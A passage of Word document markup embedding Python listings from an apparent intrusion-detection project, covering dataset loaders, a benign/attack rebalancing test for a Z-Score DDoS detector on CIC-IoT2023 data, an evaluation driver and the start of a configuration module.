    <w:p w14:paraId="20FE050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open(path, "r", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C128C3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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9920A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 = {c.lower().strip(): c for c in (r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53873D6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"rate" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064B66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raise loader.DatasetError(path + ": need Rate,Label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B6334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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DB1D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3600681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rate = float(row[h["rate"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A544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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07417A5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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FEB93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rate != rate or rate in (float("inf"), float("-inf")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48143E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continue  # skip NaN/inf rows rather than poisoning the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAEDE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label = (row[h["label"]] or "").strip().upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA0E6A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series.append((int(rate), "Normal" if label == "BENIGN" else "DDoS"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBCF4F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limit and len(series) &gt;= limit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650ED4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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0501604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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D7CB41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="119D4453" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5952D11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rebalance_series(series, benign_ratio=0.95, warmup=30, seed=1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592CF8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"""Rebuild a series at a realistic benign prevalence, benign-first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D42BACC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7404F8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 Z-Score detector rests on one assumption: that the bulk of observed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAEEF0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traffic is normal, so the running mean approximates normality. The</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1514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CIC-IoT2023 export violates that assumption outright -- only ~2.4% of its</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B4999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rows are BENIGN -- so the learned baseline is an attack-level rate and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5575A8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almost nothing deviates from it. That is a property of the corpus, not of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC18A2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the estimator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DE0922" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="751126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This helper tests that explanation instead of merely asserting it. The</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E06C0E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majority class is *downsampled* rather than the minority upsampled: every</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54240F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benign row is used exactly once and attack rows are drawn without</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06756AB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replacement until the stated benign prevalence is reached. Upsampling the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618AD34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7,173 benign rows to a 95% majority would require recycling each of them</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D92A5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several hundred times, and the resulting duplicate-driven variance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173AC8C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collapse would itself distort the standard deviation the estimator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4535BE2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depends on -- an artefact of the experiment rather than a property of the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CCD70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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026200DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04C7BF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 benign warm-up prefix is prepended so a baseline can form, mirroring a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFE17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sensor started on a quiet network, and the remainder is shuffled so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DBB81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attacks appear as sporadic bursts within a normal stream. If the recall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6332168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collapse were a defect of the estimator it would persist here, so this is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13983B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 falsifiable test rather than a flattering resample.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522A9A0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763FBA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rng = random.Random(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BADC5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benign = [s for s in series if s[1] == "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A49E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attack = [s for s in series if s[1] != "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5A950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benign or not attack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3413A38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list(series)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707458AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A7A529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keep = int(len(benign) * (1.0 - benign_ratio) / max(1e-9, benign_ratio))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BE52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keep = max(1, min(len(attack), keep))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6554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sampled_attack = rng.sample(attack, keep)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33746073" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12A4E9E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 = list(benign[:warmup])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAF143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mixed = list(benign) + sampled_attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A884F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rng.shuffle(mixed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A02980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out.extend(mixed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009029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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35869AE0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F04C96" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28B6C0D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load_kmeans_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061050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"""Read pps,ports,label rows for novelty-detection evaluation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEEC1E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series = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7492B4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open(path, "r", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2B57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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BB2D1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 = {c.lower().strip(): c for c in (r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBD8E7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ports_key = "ports" if "ports" in h else "unique_ports"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7610480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"pps" not in h or ports_key not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A7D64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raise loader.DatasetError(path + ": need pps,ports,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D3984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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E86217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series.append((int(float(row[h["pps"]])),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABE3F6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int(float(row[h[ports_key]])),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F93FBB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row[h["label"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2D2B8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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEC61F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D762A80" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5949431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load_bloom_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9EE9D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"""Read ip,label rows for reputation-filter evaluation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7D06C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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707A43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open(path, "r", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8166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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083331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 = {c.lower().strip(): c for c in (r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0175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ip_key = "ip" if "ip" in h else "src_ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6606541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ip_key not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD502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raise loader.DatasetError(path + ": need ip,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C6E9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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF1A6F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rows.append((row[h[ip_key]].strip(), row[h["label"]].strip()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339FF4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rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A693761" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="517E43B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73F8247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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119B95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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B26AB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brain = load_brain(args.brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB3E7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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B22859" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64C2920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args.knn_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1769237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out.append(evaluate_knn(loader.load_knn_csv(args.knn_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3783191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args.payload_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B65BD4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out.append(evaluate_payload(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491A27C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loader.load_payload_csv(args.payload_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B75BE5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args.zscore_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F14B5E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series = load_zscore_csv(args.zscore_csv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18940B2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out.append(evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027CD1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args.zscore_window, guard_baseline=True))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096AD4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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625AA0C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out.append(evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D61E3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args.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3651F62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guard_baseline=False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015E0028" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E38AFE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args.cic_zscore_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC14C0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series = load_cic_zscore_csv(args.cic_zscore_csv, args.cic_limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258E41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guarded = evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D60BC1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args.zscore_window, guard_baseline=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631D603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guarded["engine"] = "Z-Score (CIC-IoT2023)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7900FEA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out.append(guarded)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3635993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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4142CEE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naive = evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B07850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args.zscore_window, guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A87179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naive["engine"] = "Z-Score (CIC-IoT2023, naive baseline)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA1B31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out.append(naive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256101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args.cic_benign_ratio:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15770A8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bal = rebalance_series(series, args.cic_benign_ratio,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DC3F4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warmup=args.zscore_window)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267362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pct = int(round(args.cic_benign_ratio * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3392CF5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res = evaluate_zscore(bal, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22288F0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args.zscore_window, guard_baseline=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0904AE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res["engine"] = "Z-Score (CIC-IoT2023, %d%% benign)" % pct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B1E5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out.append(res)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACF9D6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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D74B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res_n = evaluate_zscore(bal, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538B309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args.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD4825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guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C997A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res_n["engine"] = ("Z-Score (CIC, %d%% benign, naive)" % pct)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27006F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out.append(res_n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BBFB8D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04AE2AB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if args.kmeans_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AA58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out.append(evaluate_kmeans(load_kmeans_csv(args.kmeans_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0B1C74" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="074F5FB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args.bloom_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B18A8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out.append(evaluate_bloom(load_bloom_csv(args.bloom_csv)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF4FFFA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="110CE53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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C1A50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no dataset given. try --help")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE4CCA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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8C8EC5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="644DDC7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text = print_report(out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0F33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open(args.out_json, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543845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json.dump({"generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDFF31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"results": out}, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637E5AB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open(args.out_txt, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016B7E7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f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DE8BF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wrote", args.out_json, "and", args.out_txt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAC778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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0272FBA9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="102D2A42" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FBAF1B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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D875E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sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583069D3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="545898FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Utilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F24434"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src/utils/config.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2F695E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>152 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E9F2E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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55181A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"""Central runtime configuration for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BA9C45" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A09C04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Implements NFR-3, which requires that active firewall blocking remains</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7322735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"strictly opt-in via configuration flags", and NFR-4/NFR-7 which require a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB044C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single configurable entry point that is portable across hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044C1EC1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7744810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Every tunable that used to be a magic number inside an engine or the sensor is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A166B6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declared here. Settings resolve in this order, and later sources take priority:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6923B02D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="192A930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 defaults below</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1158385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2. JSON file  (--config mantis.conf.json)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0076E4B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3. environment variables (MANTIS_*)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C30D1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4. command line flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F2CA65" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="284B3A6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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690CD7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2CB0CE5B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15E952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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330FB3E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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C746001" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1793F915" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22C751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Config:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53962D4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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4353A9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capture ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA6E3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self.interface = "any"          # informational; AF_PACKET binds all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C80517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self.packet_buffer = 5000       # in-memory ring buffer size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C1A3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self.queue_size = 100000        # sniffer -&gt; analyzer bounded queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAD802B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="171AC0F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engine thresholds (were hard-coded before) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7869D1A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self.zscore_window = 30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9C81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self.zscore_threshold = 3.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252D889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self.ddos_min_pps = 500</w:t>
      </w:r>
